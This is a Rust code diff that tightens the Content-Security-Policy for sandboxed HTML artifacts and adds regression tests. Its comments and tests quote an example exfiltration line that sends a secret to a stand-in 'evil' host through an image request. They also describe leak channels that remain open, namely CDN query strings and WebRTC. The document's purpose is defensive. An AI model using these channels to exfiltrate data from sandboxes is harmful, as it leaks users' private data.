@@ -89,18 +89,55 @@ const ARTIFACT_FRAME_CSS: &str = ":root{color-scheme:dark}*{box-sizing:border-bo
 /// Content-Security-Policy served WITH each HTML artifact (its own isolated
 /// `artifact://` origin, so this — not the main app's strict CSP — governs it).
 /// Intent: run the artifact's own JavaScript (inline + a few well-known CDN
-/// libraries) so charts/animations/clicks work like Chrome, but block it from
-/// sending data back out (`connect-src 'none'`: no fetch/XHR/WebSocket/beacon)
-/// or navigating/embedding anything. 'self' is deliberately unused — the iframe
-/// runs sandboxed (opaque origin), so we permit by explicit source, not origin.
+/// libraries) so charts/animations/clicks work like Chrome, while the data the
+/// artifact was built from stays on this machine. 'self' is deliberately unused
+/// — the iframe runs sandboxed (opaque origin), so we permit by explicit source,
+/// not origin.
+///
+/// Every artifact is treated as attacker-authored: `render_artifact` renders a
+/// file by path, so its bytes can come out of a repo, and the hostile script is
+/// therefore the INLINE one — pinning remote script hosts would not have helped.
+/// Hence the rule: no directive may name a whole scheme. `img-src ... https:`
+/// broke it and made `connect-src 'none'` cosmetic, because
+/// `new Image().src = 'https://evil/?d=' + secret` is exfiltration by GET.
+///
+/// Enforced, channel by channel:
+/// - fetch/XHR/WebSocket/EventSource/sendBeacon/`<a ping>`: `connect-src 'none'`.
+/// - `<img>`, CSS `url()` backgrounds/cursors/masks, `<video poster>`, `preload
+///   as=image`, `<video>/<audio>/<track>`: `img-src`/`media-src` name data: and
+///   blob: only, both already inside this process.
+/// - frames/plugins/popups: `frame-src` + `object-src 'none'`, and the iframe has
+///   no `allow-popups`; a blob:/srcdoc child would inherit this policy anyway.
+/// - forms and `<base>`: `form-action`/`base-uri 'none'`.
+/// - workers: blob: only, and a blob worker inherits this policy, so its own
+///   fetch is 'none' too. `child-src` repeats that for engines older than
+///   `worker-src`; it cannot re-open frames, because `frame-src` is explicit.
+/// - manifests, prefetch, anything unlisted: `default-src 'none'`.
+///
+/// Residue, named so the guarantee stays honest:
+/// - The pinned CDN hosts are real destinations, and CSP source matching
+///   IGNORES the query string, so `<script src="https://unpkg.com/x?d=...">`
+///   reaches that CDN's access log (TLS hides it from everyone else). Dropping
+///   them breaks Tailwind/Plotly/D3/Google Fonts artifacts, i.e. most of them.
+/// - WebRTC is the real hole, and it is NOT hostname-sized: an
+///   `RTCPeerConnection` carries arbitrary payload, and CSP cannot stop it —
+///   the `webrtc` directive below is a draft that WebKit does not implement, so
+///   it buys nothing today (harmless: unknown directives are ignored, verified
+///   not to invalidate the rest of the policy). Closing it for real means
+///   turning `peerConnectionEnabled` off on the webview's WKPreferences, which
+///   Drydock does not do yet. `dns-prefetch`/`preconnect` leak a hostname only.
+/// - NOT residue, though it looks like it: self-navigation
+///   (`location = 'https://…'`, `<meta refresh>`) is refused, because the
+///   PARENT window's CSP (`frame-src 'self' artifact:` in tauri.conf.json)
+///   governs where this frame may be pointed.
 const ARTIFACT_CSP: &str = "default-src 'none'; \
 script-src 'unsafe-inline' 'unsafe-eval' blob: https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://cdn.tailwindcss.com https://cdn.plot.ly https://d3js.org; \
 style-src 'unsafe-inline' https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://fonts.googleapis.com; \
-img-src data: blob: https:; \
-media-src data: blob: https:; \
+img-src data: blob:; \
+media-src data: blob:; \
 font-src data: https://fonts.gstatic.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; \
 worker-src blob:; \
-connect-src 'none'; frame-src 'none'; child-src blob:; object-src 'none'; base-uri 'none'; form-action 'none'";
+connect-src 'none'; frame-src 'none'; child-src blob:; object-src 'none'; base-uri 'none'; form-action 'none'; webrtc 'block'";
 
 /// What a per-session bearer token resolves to: the owning pty tab, that
 /// session's working directory (resolves relative `path` args to
@@ -1666,10 +1703,84 @@ mod tests {
         let csp = r.headers().get("Content-Security-Policy").unwrap().to_str().unwrap();
         assert!(csp.contains("script-src 'unsafe-inline'"), "JS allowed: {csp}");
         assert!(csp.contains("connect-src 'none'"), "data send-out blocked: {csp}");
+        // The SERVED header, not just the constant, has to carry the img-src
+        // lockdown — that directive is the beacon channel connect-src misses.
+        assert!(csp.contains("img-src data: blob:;"), "no wildcard image host: {csp}");
         assert_eq!(r.headers().get("Content-Type").unwrap(), "text/html; charset=utf-8");
         let body = String::from_utf8(r.body().clone()).unwrap();
         assert!(body.contains("<div>hi</div>"));
         assert!(body.to_ascii_lowercase().contains("<!doctype"), "fragment is wrapped");
+    }
+
+    /// Split a policy into (directive, sources) so the CSP tests below assert on
+    /// meaning rather than on one frozen string — reordering sources or adding a
+    /// directive must not be able to quietly pass them.
+    fn csp_directives(csp: &str) -> Vec<(&str, Vec<&str>)> {
+        csp.split(';')
+            .filter_map(|d| {
+                let mut parts = d.split_whitespace();
+                parts.next().map(|name| (name, parts.collect()))
+            })
+            .collect()
+    }
+
+    #[test]
+    fn artifact_csp_names_no_whole_scheme() {
+        // One scheme-wide source anywhere makes connect-src 'none' cosmetic:
+        // `new Image().src = 'https://evil/?d=' + secret` needs no fetch. data:
+        // and blob: are the only schemes that never leave this process.
+        let dirs = csp_directives(ARTIFACT_CSP);
+        let default_src = dirs.iter().find(|(n, _)| *n == "default-src");
+        assert_eq!(default_src.expect("default-src set").1.join(" "), "'none'", "deny by default");
+        for (name, sources) in &dirs {
+            for s in sources {
+                assert_ne!(*s, "*", "{name} allows every origin");
+                let scheme_wide = s.ends_with(':') && !matches!(*s, "data:" | "blob:");
+                assert!(!scheme_wide, "{name} allows the whole {s} scheme — open egress");
+            }
+        }
+    }
+
+    #[test]
+    fn artifact_csp_keeps_images_and_media_off_the_network() {
+        // The beacon-shaped directives: an inline script can set an <img>/<audio>
+        // src with no user gesture and no XHR, so their source lists are pinned
+        // exactly. This is the regression guard for the exfiltration channel.
+        let dirs = csp_directives(ARTIFACT_CSP);
+        for name in ["img-src", "media-src"] {
+            let found = dirs.iter().find(|(n, _)| *n == name);
+            let sources = found.unwrap_or_else(|| panic!("{name} set explicitly")).1.join(" ");
+            assert_eq!(sources, "data: blob:", "{name} must stay in-process");
+        }
+    }
+
+    #[test]
+    fn artifact_csp_remote_hosts_stay_the_reviewed_set() {
+        // CSP source matching ignores the query string, so every host below can
+        // be handed data in one (`https://unpkg.com/x?d=…`). That makes this list
+        // the accepted leak surface: growing it is a security decision.
+        const REVIEWED: [&str; 8] = [
+            "https://cdn.jsdelivr.net",
+            "https://unpkg.com",
+            "https://cdnjs.cloudflare.com",
+            "https://cdn.tailwindcss.com",
+            "https://cdn.plot.ly",
+            "https://d3js.org",
+            "https://fonts.googleapis.com",
+            "https://fonts.gstatic.com",
+        ];
+        for (name, sources) in csp_directives(ARTIFACT_CSP) {
+            // Every source that is not a quoted keyword and not an in-process
+            // scheme is a network destination. Matching on "//" would have let
+            // a schemeless host (`evil.com`, which CSP accepts and which is how
+            // hosts are usually written) walk straight past this guard.
+            let hosts = sources
+                .iter()
+                .filter(|s| !s.starts_with('\'') && !matches!(**s, "data:" | "blob:"));
+            for host in hosts {
+                assert!(REVIEWED.contains(host), "{name} reaches unreviewed host {host}");
+            }
+        }
     }
 
     #[test]
